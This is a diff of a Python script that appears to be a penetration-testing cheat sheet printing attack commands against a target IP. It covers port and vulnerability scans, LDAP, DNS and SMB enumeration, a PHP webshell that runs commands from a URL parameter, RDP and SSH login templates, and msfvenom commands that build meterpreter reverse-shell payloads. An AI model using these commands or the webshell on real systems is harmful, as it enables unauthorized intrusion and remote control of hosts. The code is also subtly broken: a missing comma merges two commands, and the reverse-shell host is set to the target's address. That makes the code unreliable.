@@ -16,7 +16,9 @@ ip = args.target_ip
 cmds = [
 	"########## ENUMERATION ##########",
 	f"*** scan for open ports ***\nnmap -vv -sS -Pn -oN {ip}_ports.nmap -p- {ip}",
-	f"*** get service info and vulns on ports ***\nnmap -vv -sC -sV --script=vuln -oN {ip}_svcs.nmap -p <port,port> {ip}",
+	f"*** get service info and vulns on ports ***\nnmap -vv -sC -sV --script=vuln -oN {ip}_svcs.nmap -p <PORT,PORT> {ip}",
+	f"*** enumerate ldap ***\nnmap -sT -Pn -n --open {ip} -p <PORT> --script ldap-rootdse",
+	f"*** enumerate dns ***\ndig srv _ldap._tcp.dc._msdcs.<DOMAIN> @{ip}",
 	f"*** enumerate smb shares ***\nenum4linux -a {ip}",
 	f"*** enumerate web subdomains ***\nsublist3r -d {ip}",
 	f"*** enumerate web server ***\nnikto -h {ip}",
@@ -29,8 +31,8 @@ cmds = [
 
 	"########## EXPLOITATION ##########",
 	"*** php webshell in url\n<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>",
-	f"*** rdp into windows host\nxfreerdp /dynamic-resolution +clipboard /cert:ignore /v:{ip} /u:USERNAME /p:'PASSWORD'",
-	f"*** remote shell\nssh <user>@{ip}"
+	f"*** rdp into windows host\nxfreerdp /dynamic-resolution +clipboard /cert:ignore /v:{ip} /u:<USERNAME> /p:'<PASSWORD>'",
+	f"*** remote shell\nssh <USER>@{ip}"
 	"*** list msfvenom payloads\nmsfvenom --list payloads",
 	f"*** .exe reverse shell\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f exe > win_shell.exe",
 	f"*** php reverse shell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 -f raw -e php/base64 > payload.php",
